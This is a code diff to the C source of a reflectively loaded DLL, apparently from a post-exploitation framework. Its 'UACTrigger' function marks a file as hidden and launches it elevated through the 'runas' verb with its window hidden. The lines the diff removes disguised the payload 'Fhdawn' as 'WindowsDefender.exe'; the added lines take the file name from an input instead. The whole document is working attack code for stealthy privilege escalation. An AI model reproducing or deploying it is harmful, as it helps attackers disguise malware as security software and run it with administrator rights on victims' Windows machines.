@@ -1,5 +1,5 @@
 //===============================================================================================//
-// This DLL will execute Fhdawn as administrator
+// This DLL will execute a file as administrator
 //===============================================================================================//
 
 #include "ReflectiveLoader.h"
@@ -14,15 +14,15 @@ void UACTrigger() {
     SHELLEXECUTEINFO sei = {sizeof(sei)};
 
     // WriteOutput("Copying to WindowsDefender.exe\n");
-    CopyFile( DIR , "WindowsDefender.exe", FALSE );
-    DWORD attributes = GetFileAttributes("WindowsDefender.exe");
+    // CopyFile( DIR , GetInputOutput(), FALSE );
+    DWORD attributes = GetFileAttributes(GetInputOutput());
     if (attributes != FILE_ATTRIBUTE_HIDDEN)
     {
-        SetFileAttributes("WindowsDefender.exe", attributes + FILE_ATTRIBUTE_HIDDEN);
+        SetFileAttributes(GetInputOutput(), attributes + FILE_ATTRIBUTE_HIDDEN);
     }
 
     sei.lpVerb = "runas";
-    sei.lpFile = "WindowsDefender.exe";
+    sei.lpFile = GetInputOutput();
     sei.hwnd = NULL;
     sei.nShow = SW_HIDE;
 
